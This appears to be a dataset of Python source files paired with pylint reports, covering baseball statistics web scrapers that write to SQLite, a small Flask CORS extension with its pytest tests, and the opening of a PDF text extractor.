11   teamList = [""Los_Angeles_Angels"", ""Baltimore_Orioles"", ""Boston_Red_Sox"", ""White_Sox"", ""Cleveland_Indians"", ""Detroit_Tigers"", ""Kansas_City_Royals"", ""Minnesota_Twins"", ""New_York_Yankees"", ""Oakland_Athletics"", ""Seattle_Mariners"", ""Tamba_Bay_Rays"", ""Texas_Rangers"", ""Toronto_Blue_Jays"", ""Arizona_Diamondbacks"", ""Atlanta_Braves"", ""Chicago_Cubs"", ""Cincinatti_Reds"", ""Colarado_Rockies"", ""Miami_Marlins"", ""Houston_Astros"", ""Los_Angeles_Dodgers"", ""Milwaukee_Brewers"", ""Washingon_Nationals"", ""New_York_Mets"", ""Philadelphia_Phillies"", ""Pittsburgh_Pirates"", ""St_Louis_Cardinals"", ""San_Diego_Padres"", ""San_Francisco_Giants""]
12   source = ""https://www.baseball-reference.com/players/t/troutmi01.shtml""
13   
14   def batter_pool_table(team_name, year):
15       bp = BatterPool.cursor()
16       #concanate the string
17       table_values = '(Player_Name TEXT, Age INTEGER, Position TEXT, WAR REAL, WPA REAL, wRCplus REAL, PA INTEGER, AVG REAL, OBP REAL, SLG REAL, OPS REAL, BABIP REAL, wOBA REAL, BBperc REAL, Kperc REAL, SPD REAL, DEF REAL, Worth TEXT)'
18       bp.execute('CREATE TABLE IF NOT EXISTS _' + year + team_name + table_values)
19       bp.close()
20   
21   def data_entry(team_name, year, player_name, age, position, war, wpa, rcplus, pa, avg, obp, slg, ops, babip, oba, bbpec, kperc, speed, defense, worth):
22       bp = BatterPool.cursor()
23       insertStatement = ""INSERT INTO _"" + year + team_name + "" (Player_Name, Age, Position, WAR, WPA, wRCplus, PA, AVG, OBP, SLG, OPS, BABIP, wOBA, BBperc, Kperc, SPD, DEF, Worth) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""
24       statTuple = (player_name, age, position, war, wpa, rcplus, pa, avg, obp, slg, ops, babip, oba, bbpec, kperc, speed, defense, worth)
25       bp.execute(insertStatement, statTuple)
26       BatterPool.commit()
27       bp.close()
28   
29   def web_scrape(playerList):
30       source = requests.get(""https://www.baseball-reference.com/players/g/guerrvl01.shtml#all_br-salaries"").text
31       soup = BeautifulSoup(source, ""html.parser"")
32       table = soup.find('table', id = 'batting_value')
33       table_rows = table.find_all('tr')
34       #Scrape all the data from the table
35       for tr in table_rows:
36           td = tr.find_all('td')
37           #th = tr.find('th')
38           row = [i.text for i in td]
39           #row.append(th.text)
40           playerList.append(row)
41       '''
42       table = soup.find('table', id = 'batting_standard')
43       table_rows = table.find_all('tr')
44       #Scrape all the data from the table
45       for tr in table_rows:
46           td = tr.find_all('td')
47           th = tr.find('th')
48           row = [i.text for i in td]
49           row.append(th.text)
50           playerList.append(row)
51       '''
52   
53   playerList = []
54   web_scrape(playerList)
55   print(playerList)
","21 - refactor: too-many-arguments
21 - refactor: too-many-positional-arguments
21 - refactor: too-many-locals
29 - warning: redefined-outer-name
30 - warning: redefined-outer-name
30 - warning: missing-timeout
41 - warning: pointless-string-statement
3 - warning: unused-import
"
"1   import requests
2   import sqlite3
3   from sqlite3 import Error
4   from bs4 import BeautifulSoup
5   
6   # Create the top 100 database
7   Top100 = sqlite3.connect('Top100Prospects.db')
8   
9   #Year list for the top 100 prospects
10   yearList = ['2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019']
11   
12   #Function to create the tables from 2012-2019
13   def top_100_table(year):
14       tp = Top100.cursor()
15       #concatenate the string
16       table_values = '(Rank INTEGER, Player_Name TEXT, Team TEXT, Organization_Rank TEXT, Age INTEGER, Position TEXT, MLB_Est TEXT)'
17       tp.execute('CREATE TABLE IF NOT EXISTS _' + year + 'Top100Prospects' + table_values)
18       tp.close()
19   
20   #Function to enter the data into the respective SQLite table
21   def data_entry(year, rank, player_name, team, organization_rank, age, position, mlb_est):
22       tp = Top100.cursor()
23       insertStatement = ""INSERT INTO _"" + year + ""Top100Prospects (Rank, Player_Name, Team, Organization_Rank, Age, Position, MLB_Est) VALUES(?, ?, ?, ?, ?, ?, ?)""
24       statTuple = (rank, player_name, team, organization_rank, age, position, mlb_est)
25       tp.execute(insertStatement, statTuple)
26       Top100.commit()
27       tp.close()
28   
29   #Function to web scrape The Baseball Cube for the top 100 prospects
30   def web_scrape(playerList, year):
31       source = requests.get('http://www.thebaseballcube.com/prospects/years/byYear.asp?Y=' + year + '&Src=ba').text
32       soup = BeautifulSoup(source, ""html.parser"")
33       table = soup.find('table', id = 'grid2')
34       table_rows = table.find_all('tr')
35       for tr in table_rows:
36           td = tr.find_all('td')
37           row = [i.text for i in td]
38           #Manipulates the data that is not needed
39           if len(row) > 9:
40               row[9] = row[9][:4]
41               row[13] = row[13][:4]
42               del row[-2:]
43               del row[10:13]
44               del row[5:9]
45           playerList.append(row)
46       #removes the table labels that are not needed
47       del playerList[:2]
48       del playerList[25]
49       del playerList[50]
50       del playerList[75]
51       del playerList[100]
52   
53   
54   def main():
55       #create the database for every top 100 prospect from 2012-2019
56       for i in range(len(yearList)):
57           #call the method to create 8 tables
58           top_100_table(yearList[i])
59           #stores the data of all available free agent    
60           playerList = []
61           #call web_scrape method
62           web_scrape(playerList, yearList[i])
63           for j in range(len(playerList)):
64               #insert the top100prospect data
65               data_entry(yearList[i], int(playerList[j][0]), playerList[j][1], playerList[j][2], playerList[j][3], int(yearList[i]) - int(playerList[j][5]) + 1, playerList[j][4], playerList[j][6])
66   
67   if __name__ == ""__main__"":
68       main()
","21 - refactor: too-many-arguments
21 - refactor: too-many-positional-arguments
31 - warning: missing-timeout
3 - warning: unused-import
"
"1   import requests
2   import sqlite3
3   from sqlite3 import Error
4   from bs4 import BeautifulSoup
5   
6   # Create the free agency database
7   FreeAgency = sqlite3.connect('FreeAgency.db')
8   
9   
10   # List to gather every year from 2012 to 2019
11   yearList = ['2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019']
12   
13   #Create the Free Agency Pool from 2012-2019 
14   def free_agency_table(year):
15       fa = FreeAgency.cursor()
16       #concatenate the string
17       table_values = '(Player_Name TEXT, Age INTEGER, Position TEXT, FA_Type TEXT, Rank INTEGER, Years INTEGER, Amount TEXT)'
18       fa.execute('CREATE TABLE IF NOT EXISTS _' + year + 'FA_Class' + table_values)
19       fa.close()
20   
21   #Enter the data of a player into the respective table
22   def data_entry(year, player_name, age, position, fa_type, rank, years, amount):
23       fa = FreeAgency.cursor()
24       insertStatement = ""INSERT INTO _"" + year + ""FA_Class (Player_Name, Age, Position, FA_Type, Rank, Years, Amount) VALUES(?, ?, ?, ?, ?, ?, ?)""
25       statTuple = (player_name, age, position, fa_type, rank, years, amount)
26       fa.execute(insertStatement, statTuple)
27       FreeAgency.commit()
28       fa.close()
29   
30   #Scrapes ESPN for all of the Free Agents for a given year
31   def web_scrape(playerList, year):
32       source = requests.get('http://www.espn.com/mlb/freeagents/_/year/' + year).text
33       soup = BeautifulSoup(source, ""html.parser"")
34       table = soup.find('table')
35       table_rows = table.find_all('tr')
36       #Scrape all the data from the table
37       for tr in table_rows:
38           td = tr.find_all('td')
39           row = [i.text for i in td]
40           #Check to make the correct data is being added
41           if row[0] != 'PLAYER' and row[0] != 'Free Agents':
42               playerList.append(row)
43       #Remove 2011 team and new team
44       for i in range(len(playerList)):
45           del playerList[i][4:6]
46   
47   #Function to modify the player list since some of the data from ESPN is not ideal for sorting purposes
48   def modifyPlayerList(playerList, i, j):
49       if playerList[j][3] == 'Signed (A)':
50           playerList[j][3] = 'A'
51       elif playerList[j][3] == 'Signed (B)':
52           playerList[j][3] = 'B'
53       else:
54           playerList[j][3] = 'None'
55       #set the age to the correct number
56       playerList[j][2] = int(playerList[j][2])
57       playerList[j][2] -= (2020 - int(yearList[i]))
58       #set the rank of the players, 51 is a place holder
59       if playerList[j][5] == 'NR':
60           playerList[j][5] = 51
61       else:
62           playerList[j][5] = int(playerList[j][5]) 
63       playerList[j][5] = 51 if playerList[j][5] == 'NR' else int(playerList[j][5])
64       #correct dollar amount FA
65       if playerList[j][6] == '--' or playerList[j][6] == 'Minor Lg':
66           playerList[j][4] = '0'
67       if playerList[j][6] == '--':
68           playerList[j][6] = 'Not Signed'
69   
70   #Main function to create the free agent database which contains every free agent from 2012 to 2019
71   def main():
72       #create the database for every freeagent from 2011-2020
73       for i in range(len(yearList)):
74           #call the method to create 10 tables
75           free_agency_table(yearList[i])
76           #stores the data of all available free agent    
77           playerList = []
78           #call web_scrape method
79           web_scrape(playerList, yearList[i])
80           print(playerList)
81           for j in range(len(playerList)):
82               #modify list method
83               modifyPlayerList(playerList, i, j)
84               #insert the free agent data
85               data_entry(yearList[i], playerList[j][0], int(playerList[j][2]), playerList[j][1], playerList[j][3], playerList[j][5], int(playerList[j][4]), playerList[j][6])
86   
87   if __name__ == ""__main__"":
88       main()
","22 - refactor: too-many-arguments
22 - refactor: too-many-positional-arguments
32 - warning: missing-timeout
3 - warning: unused-import
"
"1   import requests
2   import sqlite3
3   from sqlite3 import Error
4   from bs4 import BeautifulSoup
5   
6   # Create the pitcher pool database
7   PitcherPool = sqlite3.connect('TeamPitcherPool1.db')
8   
9   yearList = ['2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019']
10   teamList = [""Los_Angeles_Angels"", ""Baltimore_Orioles"", ""Boston_Red_Sox"", ""White_Sox"", ""Cleveland_Indians"", ""Detroit_Tigers"", ""Kansas_City_Royals"", ""Minnesota_Twins"", ""New_York_Yankees"", ""Oakland_Athletics"", ""Seattle_Mariners"", ""Tamba_Bay_Rays"", ""Texas_Rangers"", ""Toronto_Blue_Jays"", ""Arizona_Diamondbacks"", ""Atlanta_Braves"", ""Chicago_Cubs"", ""Cincinatti_Reds"", ""Colarado_Rockies"", ""Miami_Marlins"", ""Houston_Astros"", ""Los_Angeles_Dodgers"", ""Milwaukee_Brewers"", ""Washingon_Nationals"", ""New_York_Mets"", ""Philadelphia_Phillies"", ""Pittsburgh_Pirates"", ""St_Louis_Cardinals"", ""San_Diego_Padres"", ""San_Francisco_Giants""]
11   source = ""https://www.fangraphs.com/leaders.aspx?pos=all&stats=pit&lg=all&qual=0&type=c,3,59,45,118,6,117,42,7,13,36,40,48,60,63&season=2011&month=0&season1=2011&ind=0&team=1&rost=0&age=0&filter=&players=0&startdate=2011-01-01&enddate=2011-12-31""
12   
13   #Function to create the tables from 2012-2019
14   def pitcher_pool_table(year, team_name):
15       pp = PitcherPool.cursor()
16       #concatenate the string
17       table_values = '(Player_Name TEXT, Age INTEGER, IP REAL, WAR REAL, WPA REAL, FIPx REAL, FIPXminus REAL, ERA REAL, ERAminus REAL, WHIP REAL, Kper9 REAL, HRper9 REAL, GBperc REAL, Worth TEXT)'
18       pp.execute('CREATE TABLE IF NOT EXISTS _' + year + team_name + table_values)
19       pp.close()
20   
21   #Function to enter the data into the respective SQLite table
22   def data_entry(team_name, year, player_name, age, innings_pitched, war, wpa, fipx, fipx_minus, era, era_minus, whip, kPer9, hrPer9, gb_percentage, worth):
23       pp = PitcherPool.cursor()
24       insertStatement = ""INSERT INTO _"" + year + team_name + "" (Player_Name, Age, IP, WAR, WPA, FIPx, FIPXminus, ERA, ERAminus, WHIP, Kper9, HRper9, GBperc, Worth) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""
25       statTuple = (player_name, age, innings_pitched, war, wpa, fipx, fipx_minus, era, era_minus, whip, kPer9, hrPer9, gb_percentage, worth)
26       pp.execute(insertStatement, statTuple)
27       PitcherPool.commit()
28       pp.close()
29   
30   #Function to web scrape FanGraphs for every the pitcher on every team
31   def web_scrape(playerList, year, team):
32       source = requests.get(""https://www.fangraphs.com/leaders.aspx?pos=all&stats=pit&lg=all&qual=0&type=c,3,59,45,118,6,117,42,7,13,36,40,48,60,63&season="" + year + ""&month=0&season1="" + year + ""&ind=0&team="" + str(team + 1) + ""&rost=0&age=0&filter=&players=0&startdate=2011-01-01&enddate=2011-12-31"").text
33       soup = BeautifulSoup(source, ""html.parser"")
34       table = soup.find('table', class_ = 'rgMasterTable')
35       table_rows = table.find_all('tr')
36       #Scrape all the data from the table
37       for tr in table_rows:
38           td = tr.find_all('td')
39           row = [i.text for i in td]
40           if len(row) == 16: 
41               playerList.append(row)
42   
43   #main function to add the desired pitcher stats for every team from 2012 to 2019
44   def main():
45       counter = 0
46       #iterate through every year
47       for h in range(len(yearList)):
48           #iterate through every team
49           for i in range(30):
50               pitcher_pool_table(yearList[h], teamList[i])
51               playerList = []
52               web_scrape(playerList, yearList[h], i)
53               #iterate through every player
54               for k in range(len(playerList)):
55                   counter += 1
56                   data_entry(teamList[i], yearList[h], playerList[k][1], playerList[k][2],  playerList[k][10], playerList[k][3], playerList[k][15], playerList[k][4], playerList[k][5], playerList[k][6], playerList[k][7], playerList[k][8], playerList[k][11], playerList[k][12], playerList[k][13], playerList[k][14])
57       print(counter)
58   
59   if __name__ == ""__main__"":
60       main()
","22 - refactor: too-many-arguments
22 - refactor: too-many-positional-arguments
22 - refactor: too-many-locals
32 - warning: redefined-outer-name
32 - warning: missing-timeout
3 - warning: unused-import
"
"1   import requests
2   import sqlite3
3   from sqlite3 import Error
4   from bs4 import BeautifulSoup
5   
6   # Create the free agency database
7   International = sqlite3.connect('InternationalProspects.db')
8   
9   
10   # List for the Free Agency Pool
11   yearList = ['2015', '2016', '2017', '2018', '2019']
12   
13   #Create the International Table from 2015-2019 
14   def international_table(year):
15       ip = International.cursor()
16       #concanate the string
17       table_values = '(Rank INTEGER, Player_Name TEXT, Position TEXT, Age INTEGER, Projected_Team TEXT, Future_Value TEXT)'
18       ip.execute('CREATE TABLE IF NOT EXISTS _' + year + 'TopInternationalClass' + table_values)
19       ip.close()
20   
21   #Enter the data of a player into the respective table
22   def data_entry(year, rank, player_name, position, age, proj_team, fut_val):
23       ip = International.cursor()
24       #need the underscore because a table can't start with a number
25       insertStatement = ""INSERT INTO _"" + year + ""International_Prospects (Rank, Player_Name, Team, Organization_Rank, Age, Position, MLB_Est) VALUES(?, ?, ?, ?, ?, ?, ?)""
26       statTuple = (rank, player_name, position, age, proj_team, fut_val)
27       ip.execute(insertStatement, statTuple)
28       International.commit()
29       ip.close()
30   
31   #Scrapes ESPN for all of the Free Agents for a given year
32   def web_scrape(playerList, year):
33       #URL changes based on the year
34       source = requests.get('https://www.fangraphs.com/prospects/the-board/' + year + '-international/summary?sort=-1,1&type=0&pageitems=200&pg=0').text
35       soup = BeautifulSoup(source, ""html.parser"")
36       table = soup.find_all('table')
37       for table_rows in table:
38           table_row = table_rows.find_all('tr')
39           #Scrape all the data from the table
40           for tr in table_row:
41               td = tr.find_all('td')
42               row = [i.text for i in td]
43               playerList.append(row)
44   
45   #main function to create the database of all the top international free agents from 2015-2019
46   def main():
47       #5 tables will be created in sqLite with all available international free agents from fangraphs 
48       for i in range(len(yearList)):
49           international_table(yearList[i])
50   
51   if __name__ == ""__main__"":
52       main()","22 - refactor: too-many-arguments
22 - refactor: too-many-positional-arguments
34 - warning: missing-timeout
3 - warning: unused-import
"
"1   import requests
2   import sqlite3
3   from sqlite3 import Error
4   from bs4 import BeautifulSoup
5   
6   #Creates the player draft database
7   PlayerDraft = sqlite3.connect('PlayerDraft.db')
8   
9   yearList = ['2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019']
10   
11   #Function to create the player draft tables
12   def player_draft_table(year):
13       pd = PlayerDraft.cursor()
14       #concanate the string
15       table_values = '(Player_Name TEXT, Rank INTEGER, Position TEXT, School TEXT)'  
16       pd.execute('CREATE TABLE IF NOT EXISTS _' + year + 'Draft_Class' + table_values)
17       pd.close()
18   
19   #Inserts the data into the table
20   def data_entry(year, player_name, rank, position, school):
21       pd = PlayerDraft.cursor()
22       insertStatement = ""INSERT INTO _"" + year + ""Draft_Class (Player_Name, Rank, Position, School) VALUES(?, ?, ?, ?)""
23       statTuple = (player_name, rank, position, school)
24       pd.execute(insertStatement, statTuple)
25       PlayerDraft.commit()
26       pd.close()
27   
28   #Scrapes the internet from Baseball Almanac
29   def web_scrape(draftList, year):
30       source = requests.get('https://www.baseball-almanac.com/draft/baseball-draft.php?yr=' + year).text
31       soup = BeautifulSoup(source, ""html.parser"")
32       table = soup.find('table')
33       table_rows = table.find_all('tr')
34       #Scrape all the data from the table
35       for tr in table_rows:
36           td = tr.find_all('td')
37           row = [i.text for i in td]
38           #Adds the top 200 prospects for every year
39           if len(draftList) > 201:
40               break            
41           draftList.append(row)
42   
43   #main function to create a database for the top prospects from 2012-2019
44   def main():
45       for i in range(len(yearList)):
46           player_draft_table(yearList[i])
47           draftList = []
48           web_scrape(draftList, yearList[i])
49           #removes the heading of the table due to the structure on Baseball Almanac
50           draftList.pop(0)
51           draftList.pop(0)
52           for j in range(len(draftList)):
53               data_entry(yearList[i], draftList[j][3], draftList[j][1], draftList[j][5], draftList[j][6])
54   
55   if __name__ == ""__main__"":
56       main()
","30 - warning: missing-timeout
3 - warning: unused-import
"
"1   # def test_no_cors_enabled():
2   #     assert False","Clean Code: No Issues Detected
"
"1   from flask import Response
2   from flask.testing import FlaskClient
3   
4   
5   # def test_with_origin(client: FlaskClient):
6   #     response: Response = client.options('/some-request', headers={
7   #             'Access-Control-Request-Method': 'POST',
8   #             'Access-Control-Request-Headers': 'Content-Type, X-Custom',
9   #             'Origin': 'https://test.org'
10   #         })
11   #     assert response.status_code == 404
12   #     assert 'Access-Control-Max-Age' in response.headers
13   #     assert response.headers.get('Access-Control-Allow-Origin') == 'https://test.org'
14   
15   
16   def test_with_origin(client: FlaskClient):
17       response: Response = client.options('/some-request', headers={
18               'Origin': 'https://test.org'
19           })
20       assert response.status_code == 404
21       assert 'Access-Control-Allow-Origin'.lower() in response.headers
22       assert 'Access-Control-Max-Age'.lower() in response.headers
23       assert response.headers.get('Access-Control-Allow-Origin') is not None
24       assert response.headers.get('Access-Control-Allow-Origin') == 'https://test.org'
25       assert response.headers.get('Access-Control-Max-Age') is not None
26       assert response.headers.get('Access-Control-Max-Age') != ''
27   
28   
29   def test_without_origin(client: FlaskClient):
30       response: Response = client.options('/some-request', headers={
31           })
32       assert response.status_code == 404
33       assert 'Access-Control-Allow-Origin'.lower() not in response.headers
34       assert 'Access-Control-Max-Age'.lower() not in response.headers
35       assert 'Access-Control-Allow-Methods'.lower() not in response.headers
36       assert 'Access-Control-Allow-Headers'.lower() not in response.headers
37   
38   
39   def test_allow_method(client: FlaskClient):
40       response: Response = client.options('/some-request', headers={
41               'Access-Control-Request-Method': 'POST',
42               'Origin': 'https://test.org'
43           })
44       assert response.status_code == 404
45       assert 'Access-Control-Allow-Methods'.lower() in response.headers
46       assert 'POST' in response.headers.get('Access-Control-Allow-Methods')
47       assert 'Access-Control-Max-Age'.lower() in response.headers
48       assert response.headers.get('Access-Control-Allow-Origin') == 'https://test.org'
49       assert 'Access-Control-Allow-Headers'.lower() not in response.headers
50   
51   
52   def test_dont_allow_method(client: FlaskClient):
53       response: Response = client.options('/some-request', headers={
54               'Access-Control-Request-Method': 'PATCH',
55               'Origin': 'https://test.org'
56           })
57       assert response.status_code == 404
58       assert 'Access-Control-Allow-Methods'.lower() not in response.headers
59       assert 'Access-Control-Max-Age'.lower() in response.headers
60       assert response.headers.get('Access-Control-Allow-Origin') == 'https://test.org'
61       assert 'Access-Control-Allow-Headers'.lower() not in response.headers
62   
63   
64   def test_allow_headers(client: FlaskClient):
65       response: Response = client.options('/some-request', headers={
66               'Access-Control-Request-Headers': 'Content-Type, X-Test-Header',
67               'Origin': 'https://test.org'
68           })
69       assert response.status_code == 404
70       assert 'Access-Control-Allow-Headers'.lower() in response.headers
71       assert 'Content-Type' in response.headers.get('Access-Control-Allow-Headers')
72       assert 'X-Test-Header' in response.headers.get('Access-Control-Allow-Headers')
73       assert 'Access-Control-Max-Age'.lower() in response.headers
74       assert response.headers.get('Access-Control-Allow-Origin') == 'https://test.org'
75       assert 'Access-Control-Allow-Methods'.lower() not in response.headers
76   
77   
78   def test_dont_allow_headers(client: FlaskClient):
79       response: Response = client.options('/some-request', headers={
80               'Access-Control-Request-Headers': 'Content-Type, X-Test-Header, X-Not-Allowed',
81               'Origin': 'https://test.org'
82           })
83       assert response.status_code == 404
84       assert 'Access-Control-Allow-Headers'.lower() not in response.headers
85       assert 'Access-Control-Max-Age'.lower() in response.headers
86       assert response.headers.get('Access-Control-Allow-Origin') == 'https://test.org'
87       assert 'Access-Control-Allow-Methods'.lower() not in response.headers
","Clean Code: No Issues Detected
"
"1   import pytest
2   from flask import Flask
3   
4   from yafcorse import Yafcorse
5   
6   
7   @pytest.fixture()
8   def app():
9       app = Flask(__name__)
10   
11       cors = Yafcorse({
12           'origins': '*',
13           'allowed_methods': ['GET', 'POST', 'PUT'],
14           'allowed_headers': ['Content-Type', 'X-Test-Header'],
15           'allow_credentials': True,
16           'cache_max_age': str(60 * 5)
17       })
18       cors.init_app(app)
19   
20       return app
21   
22   
23   @pytest.fixture()
24   def client(app: Flask):
25       return app.test_client()
","9 - warning: redefined-outer-name
24 - warning: redefined-outer-name
"
"1   from flask import Flask, Response
2   from flask.testing import FlaskClient
3   
4   
5   def test_simple_request(client: FlaskClient):
6       response: Response = client.get('/some-request', headers={
7               'Origin': 'https://test.org'
8           })
9       assert response.status_code == 404
10       assert 'Access-Control-Allow-Origin'.lower() in response.headers
11       assert 'Access-Control-Max-Age'.lower() not in response.headers
12       assert response.headers.get('Access-Control-Allow-Origin') is not None
13       assert response.headers.get('Access-Control-Allow-Origin') == 'https://test.org'
","1 - warning: unused-import
"
"1   from flask.app import Flask
2   
3   from yafcorse import Yafcorse
4   
5   
6   def test_extension(app: Flask):
7       assert app.extensions.get('yafcorse') is not None
8       assert isinstance(app.extensions.get('yafcorse'), Yafcorse)
","Clean Code: No Issues Detected
"
"1   import re
2   from typing import Callable, Iterable
3   from flask import Flask, Response, request
4   
5   # Yet Another Flask CORS Extension
6   # --------------------------------
7   # Based on https://developer.mozilla.org/de/docs/Web/HTTP/CORS
8   
9   # DEFAULT_CONFIGURATION = {
10   #     'origins': '*',
11   #     'allowed_methods': ['GET', 'HEAD', 'POST', 'OPTIONS', 'PUT', 'PATCH', 'DELETE'],
12   #     'allowed_headers': '*',
13   #     'allow_credentials': True,
14   #     'cache_max_age': str(60 * 5)
15   # }
16   
17   DEFAULT_CONFIGURATION = {
18       'origins': None,
19       'allowed_methods': [],
20       'allowed_headers': None,
21       'allow_credentials': False,
22       'cache_max_age': None
23   }
24   
25   
26   class Yafcorse(object):
27       def __init__(self, configuration: dict = DEFAULT_CONFIGURATION, app: Flask = None) -> None:
28           super().__init__()
29           self.__initialized = False
30   
31           self.__origins = configuration.get('origins', DEFAULT_CONFIGURATION.get('origins'))
32           self.__regex_origin_patterns = configuration.get('origin_patterns', None)
33           self.__allowed_methods = configuration.get('allowed_methods', DEFAULT_CONFIGURATION.get('allowed_methods'))
34           self.__allowed_headers = configuration.get('allowed_headers', DEFAULT_CONFIGURATION.get('allowed_headers'))
35           self.__allow_credentials = configuration.get('allow_credentials', DEFAULT_CONFIGURATION.get('allow_credentials'))
36           self.__max_age = configuration.get('cache_max_age', DEFAULT_CONFIGURATION.get('cache_max_age'))
37   
38           self.__allowed_methods_value = ''
39           self.__allowed_headers_value = ''
40   
41           self.init_app(app)
42   
43       def init_app(self, app: Flask):
44           if not self.__initialized and app:
45               
46               self.__allowed_methods_value = ', '.join(self.__allowed_methods)
47               self.__allowed_methods = [m.strip().lower() for m in self.__allowed_methods]
48               self.__allowed_headers_value = ', '.join(self.__allowed_headers)
49               self.__allowed_headers = [h.strip().lower() for h in self.__allowed_headers]
50   
51               if not isinstance(self.__origins, str) and isinstance(self.__origins, (list, tuple, Iterable)):
52                   self.__validate_origin = _check_if_contains_origin(self.__origins)
53               elif isinstance(self.__origins, Callable):
54                   self.__validate_origin = self.__origins
55               elif self.__regex_origin_patterns is not None:
56                   self.__validate_origin = _check_if_regex_match_origin(self.__regex_origin_patterns)
57               else:
58                   self.__validate_origin = _check_if_asterisk_origin(self.__origins)
59   
60               app.after_request(self.__handle_response)
61   
62               app.extensions['yafcorse'] = self
63               self.__initialized = True
64   
65       def __append_headers(self, response: Response, origin: str, is_preflight_request: bool = False):
66           response.headers.add_header('Access-Control-Allow-Origin', origin)
67   
68           if 'Access-Control-Request-Method' in request.headers \
69               and request.headers.get('Access-Control-Request-Method', '').strip().lower() in self.__allowed_methods:
70               response.headers.add_header('Access-Control-Allow-Methods', self.__allowed_methods_value)
71   
72           if 'Access-Control-Request-Headers' in request.headers \
73               and _string_list_in(request.headers.get('Access-Control-Request-Headers').split(','), self.__allowed_headers):
74               response.headers.add_header('Access-Control-Allow-Headers', self.__allowed_headers_value)
75   
76           if self.__allow_credentials:
77               response.headers.add_header('Access-Control-Allow-Credentials', 'true')
78           if is_preflight_request:
79               response.headers.add_header('Access-Control-Max-Age', self.__max_age)
80   
81       def __handle_response(self, response: Response):
82           is_preflight_request = request.method == 'OPTIONS'
83           if not is_preflight_request and 'Origin' not in request.headers:
84               return response
85   
86           origin = request.headers.get('Origin')
87   
88           if not self.__validate_origin(origin):
89               return response
90   
91           self.__append_headers(response, origin, is_preflight_request)
92           return response
93   
94   
95   def _string_list_in(target: list[str], source: list[str]):
96      contained = [element for element in target if element.strip().lower() in source]
97      return contained == target
98   
99   
100   def _check_if_regex_match_origin(patterns):
101       compiled_patterns = [re.compile(p) for p in patterns]
102       def execute_check(origin):
103           for matcher in compiled_patterns:
104               if matcher.match(origin):
105                   return True
106           return False
107   
108       execute_check.__name__ = _check_if_regex_match_origin.__name__
109       return execute_check
110   
111   
112   def _check_if_contains_origin(origins):
113       def execute_check(origin):
114           for o in origins:
115               if o == origin:
116                   return True
117           return False
118   
119       execute_check.__name__ = _check_if_contains_origin.__name__
120       return execute_check
121   
122   
123   def _check_if_asterisk_origin(origins):
124       allow_all = origins == '*'
125       def execute_check(origin):
126           return allow_all and origin is not None
127   
128       execute_check.__name__ = _check_if_asterisk_origin.__name__
129       return execute_check
","96 - warning: bad-indentation
97 - warning: bad-indentation
26 - refactor: useless-object-inheritance
26 - refactor: too-many-instance-attributes
27 - warning: dangerous-default-value
26 - refactor: too-few-public-methods
"
"1   import pytest
2   from flask import Flask, Response
3   from flask.testing import FlaskClient
4   
5   from yafcorse import Yafcorse
6   
7   
8   @pytest.fixture()
9   def local_app():
10       app = Flask(__name__)
11   
12       cors = Yafcorse({
13           'allowed_methods': ['GET', 'POST', 'PUT'],
14           'allowed_headers': ['Content-Type', 'X-Test-Header'],
15           'origins': lambda origin: origin == 'https://from_lambda'
16       })
17       cors.init_app(app)
18   
19       return app
20   
21   
22   @pytest.fixture()
23   def local_client(local_app: Flask):
24       return local_app.test_client()
25   
26   
27   def test_origin_function(local_client: FlaskClient):
28       response: Response = local_client.options('/some-request', headers={
29               'Origin': 'https://from_lambda'
30           })
31       assert response.status_code == 404
32       assert 'Access-Control-Allow-Origin'.lower() in response.headers
33       assert 'Access-Control-Max-Age'.lower() in response.headers
34       assert response.headers.get('Access-Control-Allow-Origin') is not None
35       assert response.headers.get('Access-Control-Allow-Origin') == 'https://from_lambda'
36       assert response.headers.get('Access-Control-Max-Age') is not None
37       assert response.headers.get('Access-Control-Max-Age') != ''
38   
39   
40   def test_origin_function_fail(local_client: FlaskClient):
41       response: Response = local_client.options('/some-request', headers={
42               'Origin': 'https://other_than_lambda'
43           })
44       assert response.status_code == 404
45       assert 'Access-Control-Allow-Origin'.lower() not in response.headers
46       assert 'Access-Control-Max-Age'.lower() not in response.headers
","23 - warning: redefined-outer-name
27 - warning: redefined-outer-name
40 - warning: redefined-outer-name
"
"1   '''
2   PDF Text Extractor Main Module
3   
4   This module will read every .pdf file within a directory. It will 
5   use the PDFExtractor to extract its contents to a string. That 
6   string will then be passed to TextFormatter where it will be 
7   properly formatted to the desired format.
8   
9   The module will ask the user for a desired output file name, but 
10   if one if not provided then a default name will be used.
11   
12   The .exe file must be within the same directory as the .pdf files.
13   '''
14   
15   import os
16   import pymsgbox
17   
18   from extractor import PDFExtractor
19   from formatter import TextFormatter
20   
21   # returs a name of the output file
22   def get_user_input():
23       user_input = pymsgbox.prompt('Enter name', default=add_txt_ext(''), title='FBPI .pdf Text Extractor')
24       # closes program if user clicks cancel
25       if user_input == None:
26           exit(0)
27       return user_input
28   
29   # ensure the output file has a name
30   def add_txt_ext(user_input):
31       if len(user_input) < 1:
32           return '_output'
33       else:
34           return user_input
35   
36   # main function, runs on program startup
37   def main():
38       #create an pdf extractor
39       extractor = PDFExtractor()
40   
41       # create a text formatter
42       formatter = TextFormatter()
43   
44       # stores the name of the output file
45       user_input = get_user_input()
46   
47       # create the output .txt file
48       output_file = open(add_txt_ext(user_input) + '.txt', 'w')
49   
50       # stores a list of all files in the current directory
51       file_list = os.listdir(os.getcwd())
52   
53       # interate through all the files in the file list
54       for files in file_list:
55           # will only process .pdf files
56           if files.endswith('.pdf'):
57               # convert contents of each pdf file to a string
58               name_badge = extractor.pdf_to_text(files)
59               
60               # formats the string to the propper format
61               name_badge = formatter.name_tab_title(name_badge)
62   
63               # writes the formatted string to the output file
64               output_file.write(name_badge)
65   
66       output_file.close()
67   
68   if __name__ == '__main__':
69       main()
","19 - warning: deprecated-module
26 - refactor: consider-using-sys-exit
31 - refactor: no-else-return
48 - warning: unspecified-encoding
48 - refactor: consider-using-with
"
"1   '''
2   PDF Text Extractor Module
3   
4   This module will extract the text from a .pdf file and return the
5   contents as a string. 
6   '''
7   
8   from io import StringIO
9   from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
10   from pdfminer.converter import TextConverter
11   from pdfminer.layout import LAParams
12   from pdfminer.pdfpage import PDFPage
13   import getopt
14   
